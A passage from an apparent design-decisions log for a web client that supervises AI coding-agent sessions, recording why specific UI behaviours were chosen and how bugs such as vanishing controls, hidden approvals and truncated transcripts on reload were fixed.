the first place; clipping removes exactly the part that matters. *Raising the
ceiling* — a guess against a string that embeds a path has no ceiling. *A
size-based layout fallback to rows* — this was cited in a comment in `AskCard.tsx`
as `permissionLayout`, a function that has never existed; the layout is chosen by
`asked !== null` with no size input at all.

**Status.** Current

#### Q3.93 — Why is a boolean refused on both sides of a nested control?

**Decision.** `splitOptions` demotes a `nested` control to `overflow` when it is
`kind: "boolean"`, and does not treat a boolean `mode` as a host.

**Why.** What nests is a *menu of choices*, and a boolean has none — `wire.ts`
says the `choices` array is empty for one. As the host there is no menu to nest
into; as the nested control `ChoiceSection` draws a divider and a heading with no
rows beneath them, and `toEntries` skips booleans as well, so there would be no
second way to reach it. That is a control silently ceasing to exist, which is what
the slot partition is asserted against. `overflow` is where such a control went
before `nested` existed, drawn as a working Toggle.

**Status.** Current

#### Q3.94 — What does the settings rail owe the list it replaces?

**Rule.** A blocked count. `SettingsNav` draws `sessionLists(state).blocked` in
its header, as a control that navigates to `/`, and only when it is non-zero.

**Why.** "An approval cannot be hidden" is the one property this whole app is
shaped around, and at `lg` this rail *replaces* `SessionBrowser` in `AppShell`'s
aside for as long as settings is open. It said nothing about a waiting session, so
leaving settings open on a wide screen made every blocked row in the fleet
invisible — with no push notification and no service worker to say otherwise. The
rule had two enforcement points (the row's status dot, the machine header's
`blockedCount`) and this screen was outside both, which is how a rule that
`webcheck` asserts in two places was still regressed by a layout change.

**Why that number and not a fresh count.** It is the same predicate the browser's
own header badge, `machineSubline` and every section header read, so there is one
source rather than a second opinion that can disagree during an outage.

**Why it is a button.** It is the only thing on that screen saying it, so it has
to be the thing you can act on; `min-h-11`, like every other tap target here.
Drawn only above zero, because an always-present "0 waiting" is a number people
stop reading — which is the failure this exists to avoid.

**Status.** Current

#### Q3.95 — Which way round is a two-step confirmation, and how many are there?

**Rule.** The confirming row **ends with Cancel**, and state is held per row, in
the row's own component.

**The roster, which has moved twice since this was written and is the part that
drifts.** Three when this entry was written — deleting a person, retiring a
machine, revoking an API key. **Four now.** Signing an agent out on a host
(`SignOutButton`) took the same shape when agents moved inside the machine, and it
is the one that takes `danger` on the *first* tap: retiring a machine is undone by
enrolling it again from the same screen, while a signed-out CLI needs a device-code
flow in another tab. And "revoking an API key" narrowed to **somebody else's** —
`KeyRow` in `UsersSection` is two-step; `AccountSection`'s list of your own keys
revokes on one tap, on purpose. Revoking the key this browser is holding is allowed
and is often the point, so that screen puts the consequence **before** the button
as prose — *"Revoking the key this browser is signed in with signs this tab out on
its next request"* — rather than behind a question after it. A confirmation you
have already read is a tap that says nothing.

**One confirming control is not on a row**, and it is asymmetric rather than
inconsistent: Registration in `ServerSection` confirms **only the act that widens
authority**. Opening registration asks and states the cost, in one of two sentences
depending on whether mail is configured; closing it narrows authority and is a
single tap. The row rules below still apply to it — Cancel last, per-component
state — but there is no name beside it to keep unmoved, so it is a panel rather
than a row.

**Why the ordering is a safety property rather than a preference.** Both groups
lay out left-to-right in the same box, so a child in the same position lands on
the same pixels; `setConfirming(true)` is synchronous; and `.tap` sets
`touch-action: manipulation`, which removes the ~300ms double-tap delay a browser
would otherwise spend before dispatching the second click. With the destructive
button last in *both* states, a double-tap on a laggy connection — the ordinary
human response to a button that appears not to have done anything — put the second
tap on the confirm and deleted a person irreversibly. Ending the confirm row with
Cancel makes that second tap an undo.

**Why per row.** These lists re-render on a poll, so a "which row is confirming"
held above them ends up pointing at whoever moved into that position.

**Why not a modal.** This app had none when this was written, and inventing one
for a settings row would have put a second dismissal mechanism up against
`AskCard`'s — the one thing on screen that must never have to argue about who owns
Escape. Inline also keeps the name being deleted beside the question, unmoved, with
nothing else on the row left to hit.

**The premise is reversed and the conclusion is not** (Q7.68). `Sheet` exists, and
the objection it answered is answered rather than dodged: `ui/overlay.ts` is a
single arbiter — a LIFO stack and one capture-phase listener — so a second layer no
longer means a second mechanism. The row pattern is untouched anyway, on the
argument that never depended on the premise: a question, its answer and its undo
laid out left-to-right is a **row** shape, and it keeps the name it is about beside
it, unmoved. A dialog moves the name.

**Status.** Current, with the roster and the no-modal premise updated above

#### Q3.96 — Can somebody sign in with an API key?

**Decision.** Yes, from `SignIn` itself, behind a closed-by-default disclosure
calling `store.useApiKey`.

**Why.** `callerAuth` accepts either credential and `CLAUDE.md` names an API key
as the way in when a password is lost or the service has been rolled back past the
release that added passwords — but the paste-a-key gate that preceded sign-in, the
only field that ever took one, was deleted with that release. Without a
replacement a single 401 puts a key-only account permanently outside the app: the
sign-in form asks for a password the account has never had, and `clearSession` has
already dropped the stored key.

**Structure, and each part is load-bearing.** It is a **sibling `<form>`**, not a
field inside the password form — nested forms are invalid HTML, and one form
around both would make Enter in the key box submit an absent name and password.
The toggle is `type="button"`, because a bare `<button>` inside a form defaults to
submit. The reveal is `tone="plain"` against the password button's `accent`, so
there is one primary action on the screen. The key field turns off
`autoCapitalize`, `autoCorrect` and `spellCheck` as well as `autoComplete` — not
decoration: a phone capitalising the first character of an opaque key yields a
credential wrong in a way nobody can see.

**Why it proves the key with `GET /v1/me` rather than `bootstrap()`.** Bootstrap
swallows an auth failure by design, so a wrong key pasted into a form would
resolve happily and leave somebody looking at a sign-in screen with no idea why.

**Status.** Current

#### Q3.417 — Which config chips say their own name, and why did the strip move when effort changed?

**Decision.** Two things, and they are the same question asked about width.
`showsCaption` is `false` for exactly `model` and `thought_level`, so those chips
draw an icon and a value and nothing else. `chipReserve` returns every label the
effort chip could show, and `AgentConfigBar` renders them invisibly in one grid
cell so the column is sized by the widest of them.

**Why those two lose the caption.** They are identified twice over without it: a
`CATEGORY_ICON` entry, and a value that is a proper noun — "Opus 5", "Adaptive".
"Model" beside "Opus 5" is a word that says nothing and a width that changes for
nothing.

**Why `mode` and an unknown category keep theirs.** "Manual" alone leaves nothing
on screen saying what is on manual — a complaint this UI has already answered
once. An unknown category has **no icon**, so a caption-less chip there is a bare
value with nothing identifying it, in the `…` popover where there is no position
to read it by either. The rule is therefore "drop the caption only where the chip
is identified without it", not "drop it where the screen is narrow".

**Rejected — the `hidden sm:inline` it replaced.** That answered a width question
with a breakpoint: the caption disappeared on a phone for the control that needed
it and reappeared on a desktop for the ones that did not.

**Why the reserve exists.** The right-hand cluster is right-aligned, so a chip
that grows drags everything to its left along with it: `Adaptive` → `Max` moved
the model chip by five characters on every change. Reserving is the fix that keeps
the reading order `model` → `effort` — see the rejection below.

**Why the labels are rendered rather than measured by `length`.** Character count
is a proxy that is wrong the first time a narrow-lettered word is longer than a
wide-lettered one. Stacking the real strings in one grid cell sizes the column in
the real font, and costs one invisible span per reserved string.

**Why the reserve is per category and not per agent — the correction.** It was
"the widest of the choices *this agent* published", which is the obvious reading
and is wrong twice over: claude's effort chip came out wider than kimi's, so the
same strip was a different shape depending on which session was open and moving
between two sessions moved every button; and a control keeps its slot after the
agent stops offering it, at which point there are no choices left to measure. One
list per category — `Accept Edits`, `GPT-5.6-Sol`, `Adaptive`, each beside `—` —
is the same width on all three agents before any of them has said anything. The
strings are measured values and are the longest *ordinary* one for their
category: `Bypass Permissions` is longer and is the mode claude drops unless it
runs as root, so sizing to it would spend a third of a phone's strip on a value
almost nobody sees. Longer values truncate, with the full text in the menu and in
the chip's `title`.

**Why the sizers are `hidden sm:block`.** All three reservations at once are
~510px of chips and gaps against a 390px phone. Below `sm` the sizers leave the
layout entirely and the chips size to their content and truncate under pressure,
which is what they did before any of this; above it there is room. A breakpoint
for a *space* question is the one thing a breakpoint is honestly for — unlike the
caption rule above, where a breakpoint was standing in for "is this chip
identified without its name", which is not a question about width.

**Rejected — reordering the cluster.** Putting effort leftmost would make its
growth move nothing at all, one line and no reserved space. It was refused because
`RIGHT_ORDER` is a stated reading order (`model` then `effort`) and reversing it
to solve a width problem trades a fixed layout question for a permanent
readability one.

**Status.** Current

#### Q3.418 — The composer's controls vanish during a restart, and flicker on every change. Why, and what fixed it?

**Rule.** Two defects with one symptom-shape, and they are unrelated.

**The disappearance has two causes, and the second is not a restart at all.** An
agent drops a control when the *model* stops offering it: measured, all three
build the effort list from the currently selected model's own levels
(`claude-agent-acp` `acp-agent.js:4838` gates on `supportsEffort`, and codex and
kimi gate identically), so choosing Haiku deletes the effort option from
`configOptions` outright. The chip vanished, every button beside it moved, and
nothing said where it went — on a strip whose stated rule is that its shape must
not change under a thumb.

The fix is the same memory, used a second way: `holdConfig` merges by option id
instead of replacing, so the last version of every control a session has seen
survives; `drawnControls` returns the live set **plus** the slots of anything
missing from it, and names those in `unavailable`; `Absent` draws such a slot with
the control's name, `—` for a value, and one menu row saying there is nothing to
choose. Not disabled, deliberately: a dimmed inert chip answers "why is this
greyed out" with silence on a phone, where nothing hovers.

**And the slot has to be the same width as the control it replaces**, which the
first version of it was not: it drew the control's name where the live chip
deliberately does not, so choosing Haiku widened the effort chip by a word and a
gap and moved every button in the right-hand cluster. `chipParts` now decides a
chip's contents once for both states, and `chipInner` draws them once, so the
property is structural — `caption` and `reserve` do not depend on availability,
and the only thing that changes is the string inside a box already sized for it.
`webcheck` asserts that over every category rather than over effort, because the
next control an agent drops will not be this one.

The residue this entry used to record — that changing the *model* still changed
the model chip's own width — is closed by the same mechanism, once the reserve
stopped being per-agent: a fixed string per category costs a bounded width where
"the longest name this agent offers" was unbounded, which is what had made it look
unaffordable. Above `sm` no chip on the strip changes width for any reason.

**Why the drawn list is built live-first.** `drawnControls` could have drawn
`held` and trusted it to be a superset — it is one, because `holdConfig` merges —
but a rule that reads correctly only while a function in another file keeps its
promise survives exactly until somebody edits that file. Building it as "live,
plus what is missing from live" means a *value* can only ever come from the
agent's current answer. `webcheck` caught this the moment it was written the other
way round, on the existing assertion about where values come from.

**The disappearance's first cause.** The daemon empties `agentConfig` the moment the agent dies
(`doStop`: "the controls belong to the live agent, so they go with it") and a
restored session is constructed empty, both deliberately — they describe what an
agent will accept *right now*. What that left on screen was a composer whose whole
row of controls blinked out for the length of every restart: every deploy, every
auto-resume, and every ultracode change, which is what made it worth fixing rather
than tolerating. Fixed **client-side**: `holdConfig` keeps the last set a
*running* agent published on the store's `SessionRow`, `drawnControls` chooses
between the live answer and that memory, and `stale` marks which — readable, not
tappable, since there is nothing on the other end to accept a change.

**Why not the daemon.** Keeping a dead agent's controls in `agentConfigState`
would make the snapshot describe an agent that is not there, and `setConfigOption`
validates against that same state — so the daemon would start accepting changes
for a process that cannot receive them. The client's copy is inert by
construction: it is only ever drawn.

**The arm that carries it.** `hasLiveAgent` — a live agent that publishes nothing
*clears* the memory. Without that test this could not tell an agent with no
controls from a session with no agent, and a dead set of chips would be pinned to
a running session for ever. `stopping` is excluded from it: `doStop` touches
before *and* after emptying the config, so an emptied `stopping` frame is
ordinary and treating it as an answer would discard the memory on the one path
this exists for.

**Not held: the context readout.** "A dead agent's window occupancy is not a fact
about anything." `contextPercent` already answers `null` and the ring already
draws `unknown`, so it keeps its slot and says "cannot tell", which is true.

**The flicker is a different cause.** One tap set a single `busy` for the whole
bar and every control took `disabled={disabled || busy !== null}` with
`disabled:opacity-40`. `.tap`'s transition list is three properties and
deliberately excludes `opacity` — so the entire row snapped to 40% and snapped
back, uneased, around a round trip often under a second, while the paperclip and
the ring (which take no such flag) stayed bright. The serialization is worth
keeping — setting a model rebuilds the mode list, so two concurrent changes really
do race — so the fix splits the prop rather than removing the lock: `disabled` is
semantic and dimmed, `locked` is transient and inert but undimmed. What is left is
one coherent progression on the one chip that was tapped: chevron → spinner → new
value → chevron.

**Rejected — adding `opacity` to `.tap`.** That class is on every row of a list
that re-renders on every event; its own comment says transitions there are opt-in
per property. Buying an eased fade in the composer would pay for it fleet-wide.

**The third defect, found while fixing the first two, and the worst of them.**
`wire.ts` mirrors the daemon's `ExitReason` **by hand** — it cannot import
`src/events.ts` — and `config_changed` was added on the daemon side only. So a
session the daemon was deliberately restarting answered `endedWithDaemon` with
`false`, fell out of `waitingForDaemon` into `showsAsEnded`, and `Composer.tsx`
early-returns on that: the **entire composer** left the screen for the length of
every ultracode change, not merely the control strip. Every assertion in
`webcheck`'s exit-reason section stayed green throughout, because all of them read
the same wrong copy. `webcheck` now reads `src/events.ts` off disk and compares
both halves — the union and `DAEMON_EXIT_REASONS` — which is the same technique
already used for `cpctl`'s enrollment lines and `SessionBrowser`'s slices.

**The fourth, on the same row: a loading state about a decision already made.**
The chip drew the value it was *leaving* for the whole round trip — choose Low and
it read "Adaptive" with a spinner, then Low. `withChoice` draws the chosen value
at once and the daemon's answer replaces it; a refusal snaps it back beside the
toast.

**And the fifth, which is the fourth done wrong once.** That override was first
held in `AgentConfigBar`'s own `useState` — and there are **two doors** into
`applyConfigChange`, the strip's chip and the composer's `/effort` menu, which is
the whole reason that function is exported. So a level chosen from the slash menu
recorded nothing, and drew the daemon's value for the entire restart. The record
moved into the dispatcher (`choices.ts`, a module map keyed by session and option
id, released on an identity-checked sequence number so an early answer cannot
release a later choice), which makes it a property of the one function every door
goes through rather than a convention each door must remember. The assertion that
would have caught it is a **call-site** one — recorded and released exactly once,
both inside the dispatcher, with `Composer.tsx` writing neither while still being
a second caller — because every pure assertion about `withChoice` passed while the
defect was live on screen. That is the trade the composer already makes with a message it is still
sending, and it is not the optimism the Stop control refuses — that one would
claim an *agent* had been called off while it was still working, which is a
statement about somebody else rather than about what was chosen here. The spinner
additionally waits `SPINNER_AFTER_MS` (250ms), because an ordinary
`set_config_option` answers in tens of milliseconds and a spinner shown at once is
a two-frame flash — the same flicker this row was fixed for twice already — while
a change that restarts the agent runs into seconds and still reports itself.

**And the dot.** `starting` carried `running`'s `animate-blink` while `TONE_DOT`'s
own comments reserved that motion, twice, for "work actually happening" — so a
restart announced for about a second that an idle session was working. It is the
hollow pulse now, the same mark `waiting` carries, because it is the same sentence
read from the live side. Asserted over the table rather than the entry: exactly
one tone may blink.

**Status.** Current

#### Q3.419 — Reloading a session drew nothing but `working…`. Why, and what fixed it?

**Decision.** Three separate causes, three fixes, and none of them is a control the
reader has to find. The loader retries a page that fails and is re-driven on every
poll (Q3.22); a session whose row has not arrived yet says so with a skeleton
rather than denying it exists; and a transcript with nothing in it and a
conversation still coming draws the shape of what is coming.

**Why.** Reported from a phone: reload a session whose agent is working and the
whole screen is the one line that does not come from the transcript. Everything
above it — the entire conversation — was missing, sometimes permanently, and
sometimes replaced by a button offering to load it.

**Why the transcript is empty at all.** On a cold load the socket contributes *no
history*: `reattachSince(null, lastSeq)` attaches at the tail with `keepHeld:
false`, so every event has to arrive over HTTP afterwards. That is correct — the
alternative is asking the daemon to replay a whole log into a bounded queue — but
it means the window between attach and the first page is a window with nothing to
draw, and it is not the 40ms this file's own comment cited. That measurement was
taken over the development relay; the real chain on a phone is `POST /v1/tokens`
→ `forgetRoute()` and re-probe (bounded at 1.5s) → `GET /sessions?limit=60` →
attach → the first `GET …/events`.

**The permanent case, which is the one that was actually reported.** `loadAll`'s
`catch {}` swallowed every failure and nothing re-drove it: `SessionView`'s effect
is keyed on ids that never change, and `attachWanted` skipped any key that already
had a stream. One request dropped as a radio handed over therefore left the
conversation empty for the life of the tab. `historyRetry` waits 500ms and 2s and
asks the same `since` again — **inside** the `fetchPage` closure, so `fillWindow`
keeps the block and cursor it had rather than refilling the window from its floor —
and `attachWanted` now calls `loadAll` for open sessions as well as opening
sockets, which puts the recovery on the poll that already exists. Only a transport
failure is retried: an `ApiError` is the far end *answering*, and asking again gets
the same answer with the latch held across it.

⚠ **Both halves of that last sentence are wrong and Q3.113 replaces them.** The
schedule was the load-bearing part, not the classification: measured, the identical
relay outage delivered as *transport* failures — which those two waits did retry —
left a byte-identical truncated transcript, because 2.5 s cannot survive a daemon
redialling on its own 1 s→30 s backoff. And three answered refusals do heal on their
own, so `meansLater` admits them. What survives of the reasoning is narrower and
still true: a refusal only an **admin** can change must never be retried.

**The screen that denied the session existed.** `SessionView` read `rowsByKey`,
found nothing, and drew *"That session is not on this daemon."* or *"<name> is not
reachable right now."* — neither of which it can know during that same window,
since `bootstrap` promotes to `ready` on the *machine* list and `resumeMachine`
drops the route memo before probing, leaving `reach` at `unknown` or `probing`.
`missingRowReason` is the four-way answer and `listed` is the store's record of
having had a session list back from that machine at least once. The cell that was
the bug is `online` + never-listed: a daemon answering a health probe says nothing
about whether anybody has asked it for a session list, and only the second question
licenses reporting an absence.

**Why the skeleton is keyed on `unfetched`, not on `loadingHistory`.** A session
that genuinely has no events sits at `loadedFrom === 1` with `unfetched === 0`, so
it draws "No events yet." with no skeleton flashing over it first. And between a
page that failed and the poll that re-drives it, `loadingHistory` is false while
the conversation is still missing — a `loadingHistory` gate would blink the
skeleton out and back rather than saying one thing continuously.

⚠ **That paragraph is right about the skeleton and was read as covering the whole
state, which it never did** — see Q3.112. The skeleton is the `rows.length === 0`
arm alone, so it left the screen the instant the first of six windows landed and
every frame after that said nothing at all. The rule is `transcriptNotice` now, and
the assertion that was missing is its totality rather than any one of its arms.

**Rejected — hiding the fast case behind an `animation-delay`.** `index.css`
collapses every animation to a single 0.01ms iteration under
`prefers-reduced-motion`, with no `fill-mode`, so an element started at `opacity-0`
runs its cycle and reverts: permanently invisible for exactly the readers least
able to afford a blank screen. A skeleton replaced by content of the same shape in
the same place is a paint rather than a flicker, so there is nothing to hide.

**Status.** Reversed an earlier decision

#### Q3.420 — Why did `Start` do nothing on the create-session screen?

**Decision.** One owner for the chosen folder. `DirectoryPicker` holds `path`,
reports it up **unconditionally including `null`**, and is keyed on the machine so
a change of machine is a remount. Nothing else writes `cwd`.

**Why.** `Start` is disabled on `cwd === null`, and `cwd` was duplicated: the
parent held it, the picker held `path`, and the picker reported up through an
effect keyed on its own `path`. So any write to `cwd` the picker did not make was
**unrecoverable by construction** — `path` had not changed, the report never fired
again, and the button stayed dead over a folder its own footer was naming.

The write was `setCwd(null)`, in the effect that fetches the agent list. Three
ordinary routes reached it: the rail's folder `+` (`/new/:machineId/:cwd`, where
child effects run before parent effects, so the wipe landed second and won), the
"re-check" button after an inline sign-in (`agentsEpoch` is in the same dependency
list), and any change of machine. Reporting `null` too is what makes `cwd` a strict
mirror of `path` rather than a copy that can drift; the `key` is what resets the
picker without anybody having to write to the parent at all.

**Two smaller things found in the same file.** Both `create()` guards were silent
`return`s, and one of them — `daemonFor` answering `undefined` — is reachable with
an *enabled* button, i.e. a control that looks live and does nothing. And the
footer hint had two arms where the state space has three, so it was empty in
exactly the state `Start` was disabled: a 40%-opacity button with nothing anywhere
saying what it was waiting for. Both effects also now depend on the `DaemonClient`
itself rather than the machine id, because an effect that returns before reaching
its request has nothing to bring it back.

**Status.** Current

#### Q3.104 — A file change was drawn as a path. What does it draw now?

**Decision.** A diff. `diffLines` in `packages/web/src/diff.ts` turns a
`FileChangeEvent` into hunks with two line-number gutters, `+N −M` counts and
word-level marks; `ui/DiffView.tsx` draws it, for the transcript **and** the
approval card. `lineDiff` in `permission.ts` was deleted rather than kept beside it.

**Why.** `EventList`'s `file_change` arm was one mono line — an icon, the absolute
path, a download button — and `oldText` was read *only* to choose between
`FilePlus2` and `FilePen`. So the one thing an agent does that changes the project
was the least legible thing in the transcript, and a `Write` card could not even be
opened: `readInput` suppresses the pretty-printed arguments as soon as it finds a
body field, so `detail` is `null`, and with no locations every term in
`opensToAnything` was zero. That is why `changes` had to become a term in it rather
than something inferred.

**Why one function and not two.** The old one served the approval card only and was
a common prefix/suffix trim: exact for a fragment, which is what claude and kimi
send, and wrong for codex, which sends **whole files on both sides** — an edit with
two changed regions shares its beginning, its end and everything between them, so
trimming alone reports the entire middle as rewritten. The replacement keeps the
trim and puts a bounded LCS behind it, so both agents get hunks. Sharing it upgraded
the approval card in the same commit, which is the point: they are the same object
before and after the fact.

**The counts are the client's own and are not git's.** They come from the event, so
they measure the replacement the agent *stated* — which is the only thing that can
be said about a historical edit at all. `GET /sessions/:id/changes` has honest
`git --numstat` numbers and the web client still does not call it, deliberately: it
answers "what is in the working copy now against the base", a different question
that would put a different number under the same sign. Two consequences are
accepted and named: a claude `Write` reports `oldText: null` even when overwriting,
so an overwrite reads as a creation, and nothing here can repair that because the
daemon never saw the previous file.

**Measured** against `~/.reemoat/reemoat.db` on 2026-08-13. All 15 `file_change`
events carry `source: "diff"` and a non-null `toolCallId`; the counts reproduce an
independent `difflib` pass exactly — `+118 −0` on a creation, `+19 −8`, `+8 −11`,
`+2 −1` on edits. Line numbers are available because the tool call's own
`locations[0].line` is the hunk's `newStart` (`mergeUpdates` keeps the last non-empty
`locations`, and the call's own is empty), so no new join was needed.

**Bounds.** 250 000 LCS cells after the trim, past which it degrades to one
replacement block and says `wholeFile` — measured, 700 lines a side crosses it and
answers in 0.3ms, while 2000 lines differing by one line never reaches the table.
60 drawn lines per file with `omitted` carrying the rest, and the counts stay the
true totals. `changeCounts` memoises in a `WeakMap` keyed on the event, because
`buildTail` re-derives every node on every streamed token.

**The refusal that matters most.** A `file_change` over the 128 KiB per-event cap
has each side clipped to half of it, so both are cut at the same offset and the
common suffix is destroyed — a diff over them reports the untouched tail of the file
as rewritten. `unavailable: "truncated"` is how "cannot say" stops being drawn as
"nothing changed", and `changeCounts` answers `null` rather than `0` for the reason
the worktree counts do: `?? 0` would report the largest edit in the log as an empty
one.

**A permission codex did not name is named here too.** Measured in the log: codex
sends a permission request with no title, so the daemon's
`title = toolCall.title ?? toolCallId` falls through to the id and the transcript's
only record of an approval read `✓ exec-55382d16-8647-4b5e-a87c-32c95b8ed2e8` — a
decision somebody made, saying nothing about what was decided. `permissionHeadline`
already rescued the *card*; the row was never rescued, and folding made it prominent
by putting it between a group and a card. `buildTail` collects
`toolCallId → title` on the walk it already runs and fills `EventNode.heading` in a
pass afterwards — afterwards because a permission is met **before** the `tool_call`
that names it. Triggered on the exact equality the daemon's fallback leaves behind,
so it names no vendor; and a call with no name of its own lends nothing, or one uuid
would be swapped for the same uuid.

**Colour.** `--color-add`/`--color-del` are reintroduced, which reverses part of the
palette entry; see the ⚠ note there. The fill is tinted and the text is not, so no
contrast measurement moved, and the two tints are 1.024 apart — hue alone — with the
`+`/`−` sigil and the two gutters carrying the distinction without it.
`webcheck`'s retired-colour gate now asserts their **presence** as well as the other
four's absence, because a token deleted while a utility still names it is the same
silent no-paint with the halves swapped.

**Status.** Current

#### Q3.109 — Two foldables side by side, one framed and one not. Which frame goes?

**Decision.** Both. A tool call has **no fill and no border**; it is a bare row, like
the folded run beside it. Its expanded body hangs off `border-l-2 border-edge`, the one
nesting idiom this transcript has. Failure loses its box, and — see Q3.111 — its weight
too; the `X` at full `fg` is what marks it.

**Why.** Reported from a real screen: a collapsed group and a single tool call, one
bare and one in the classic `rounded-lg bg-raised/50`. Two shapes for one idea, and
what differed between them was **arity** — a run of one is never wrapped (Q3.105), so
whether a foldable had a frame depended on how many calls happened to be next to each
other. That is not a distinction a reader can use.

**This reverses two earlier decisions, and both were right about their own step.** The
first took the *border* off ("twenty bordered boxes read as twenty things demanding to
be looked at") and kept a tonal step. The second argued the step itself: `raised/50` at
1.10:1 for machinery against `raised` at 1.22:1 for the message you wrote, "two grades
of one token rather than a fourth surface". What both were doing is saying *this is a
thing*, and the transcript now says it better with position and words: a summary row,
and anything under it on a left rail.

So fill-versus-no-fill replaces two grades of one grey, which is a **bigger** step in
the same direction — and the two things still filled are the ones worth it: the message
you wrote, and a plan.

**What the frame was carrying, and where each part went.** The header/body divider was
`border-t border-edge` inside the box; it is the left rail now, shared with a
subagent's steps and a group's children. The `bg-surface` on the children well existed
only to give a nested card an edge inside a filled parent, and goes with the fill. The
arguments and the output kept their own wells (`bg-raised/50` and `bg-raised`), because
a well inside a row is still a thing. And `failed`'s `border border-edge-strong` around
an otherwise frameless row would have been the same inconsistency one size down.

**It also exposed a duplication the frames had been hiding.** A card openable for its
*output* still drew the arguments underneath a row that was already showing them — one
command, twice, one line apart. `detailWorthDrawing` is that rule as a function with
two callers (the chevron and the block), rather than one expression in `tail.ts` and a
bare `detail !== null` in the JSX that agreed by accident.

**Still open.** The path can appear three times on one expanded edit — the row's
headline, the diff's own header, and the `locations` entry that carries the only
per-file download button. That was tolerable inside a box and is louder without one;
moving the download onto the diff header would settle it, and has not been done.

**Status.** Reversed an earlier decision

#### Q3.110 — Three things a screenshot showed that no assertion could

**Decision.** Machinery is drawn at `text-fg/85`; a permission row is aligned to the
tool-row grid glyph for glyph; a title is clipped **in code** when clipping pays for
itself, and the card then opens to the whole of it; and a value beside the title is not
drawn when the title already echoes it.

**Why, each.**

**The dimming.** A tool row inherited `fg` — the same value as the agent's prose — so
with the frames gone (Q3.109) machinery read as part of the sentence above it.
`text-fg/85` measures 10.99:1 on the pane against prose's 17.37 and `muted`'s 7.75, so
it is a step *between* the two rather than a demotion to caption. A failure goes back
to full `fg` plus semibold, because that is the row you are meant to stop at. ⚠ That
last clause is reversed by Q3.111: weight there made a folded run's summary the loudest
text in the transcript.

**The alignment.** `PermissionResolvedRow` had one glyph where a tool row has two and no
horizontal padding where a tool row has `px-1`, so once an approval folded *into* a run
it sat four pixels left of its siblings and its text a whole glyph left of theirs. The
second slot is now reserved and **empty**: a permission has no ACP kind of its own, and
borrowing the tool's would be decoration standing in for alignment. Only visible in a
screenshot, which is the honest note here — every pure assertion was green.

**The title clip, and why a flat threshold was wrong.** `truncate` fits a title to the
row and throws away the question this codebase cares about — *was anything cut off* —
which is why `SUMMARY_CHARS` was already in `tail.ts` and not in CSS. Without an answer,
codex's web search could not be opened at all: its title is every query it ran (measured
at **161** characters) while `rawInput.query` is codex's truncated copy of the first, so
`opensToAnything` correctly refused, onto a body that would have said *less* than the
row. But clipping at 60 or 80 alone was worse than nothing for the near misses: every
drawn title in the database is median **41**, max **161**, tail 82 · 82 · 87 · 148 ·
161, so a flat cut spent a whole extra line to reveal two to seven characters.
`TITLE_OVERFLOW_MIN` is the fix — the cut happens only when it hides more than twenty
characters, which on this database is exactly the two payload titles and none of the
others.

**The echo.** The rule was exact equality, from codex naming a `Bash` call after its
command. The log holds two more where the strings differ and the second copy is still
worth nothing: `Read file '<path>'` beside the bare path, and the web search beside
`<first query> ...` — codex appends a literal ` ...` to its truncated copy, which is why
a containment test on the whole string fails and `headlineWorthDrawing` compares a
24-character prefix instead. Measured over every drawn pair: it suppresses those three
and keeps `Bash` beside `npm test`, `Edit` beside a path, and a subagent's duration.

**What this closes.** The "path three times on one expanded edit" left open by Q3.109 is
now twice — the row's echo is gone, the diff's own header and the `locations` entry with
the download button remain.

**Status.** Current

#### Q3.111 — One dimness, failures included. What did weight cost?

**Decision.** Every machinery row in the transcript is `text-fg/85` and none of them
takes weight: a folded run's summary, a tool call's title, an approval. A failure is
marked by its `X` at full `fg` and, on a run, by `N failed`.

**Why.** Weight was introduced as the substitute for the box a failed card lost
(Q3.109), on the reasoning that a blocked row in the rail already makes that
substitution. It worked on a card and inverted on a *run*: a group carrying one failed
call among five drew its whole summary in semibold `fg`, so
`Read SKILL.md, ran 2 commands, searched` was the loudest text on screen — above the
agent's prose, on the row a reader is least likely to need. Reported as "why is the one
below dim and the one above even bold".

The rail's substitution is right *there* because a waiting session is a thing a person
must walk over to. A finished run with a failure inside is not; it is history with a
count on it. So the count does the work, and it already survived the collapse for
exactly this reason.

**What is left, and it is deliberately two things rather than three.** The `X` is drawn
at full `fg` by `tone`, unchanged, so a failed row still has the only full-strength
glyph in its column; and `N failed` rides the summary. Nothing is coloured, because
`danger` is control-only and this is content.

**Not made uniform:** a **refusal** keeps its weight (`CircleSlash`, semibold, the word
*denied*), and so does a request nothing ever answered. Those are the two rows this
transcript will not quieten — one is the only record that somebody said no, the other
that the agent is still waiting — and neither was part of the comparison that prompted
this.

**Status.** Current

#### Q3.112 — A reloaded conversation began mid-word with nothing saying why. What was drawn?

**Decision.** Nothing was drawn, and that is the defect. `transcriptNotice` in
`store.ts` is now the single answer to "why does this not start at its beginning",
six-valued, and `EventList` renders exactly what it says — visibly and, through the
same string, in the `role="status"` region.

**Why.** Reported as *"on reload the conversation regularly does not load fully — it
seems to begin at some arbitrary point and you cannot scroll up to the earliest user
message"*. Five booleans in `EventList`'s body decided what went above the rows, each
defensible on its own, and the ordinary state of a reload fell through every one:
`awaitingHistory` required `rows.length === 0`, so the skeleton left the moment the
*first* 500-event window landed; `showFloor` required `unfetched === 0`, so it could
only speak once paging had finished; `atCeiling` required 20 000 held events against a
largest real session of 2856; the reveal button required a `context_cleared`, of which
the live database has none; and "No events yet." required no rows.

**Measured** against `~/.reemoat/reemoat.db`, 2026-08-13, by rendering the shipped
component under `react-dom/server`: the markup above the rows container is
**byte-identical — 48 characters, the bare column `<div>`** — for *"newest 500 of 2856
held, a run in flight"*, *"newest 500 held, the run gave up"* and *"all 2856 held"*.
The `role="status" aria-live="polite"` region was the **empty string** in the first two,
because it was gated on the same `rows.length === 0` the skeleton was. So the
truncation was inaudible as well as invisible.

**What the reader actually saw**, from the same log: with the newest 500 of
`s_ba0df24a`'s 1285 events held, the whole transcript is **one row** and no `prompt` at
all; with 1000 held, still one row. `s_cdea4faa` has five intermediate frames and the
first user message appears only in the sixth. The top row at 1000 held events begins
mid-word — `"ntract roles (guardian = timelock, …"`, a sentence about contract
roles cut through its first word, verbatim from the session that produced it — which
is precisely the rendering the floor sentence was written against (Q3.22), and at
500 it is a *complete* agent greeting, i.e. the most convincing possible false start.

**Why a pure function beside `loadStop` rather than a sixth boolean.** The two read the
same five `Transcript` fields and answer the same question from opposite ends — one
decides whether paging carries on, the other says why it is not there yet — so the state
where `loadStop` says `null` (still willing) and the screen says nothing is exactly the
hole that was here. `webcheck` asserts that pair, plus the property over a 720-state
grid: **with history outstanding and no cut in force, something is always said.** No
individual arm would have caught this; the missing assertion was the totality.

**The two new arms are split on `loadingHistory`** because a sentence has to be true in
the state it is drawn in: one run is in flight (`loading`, with the spinner every other
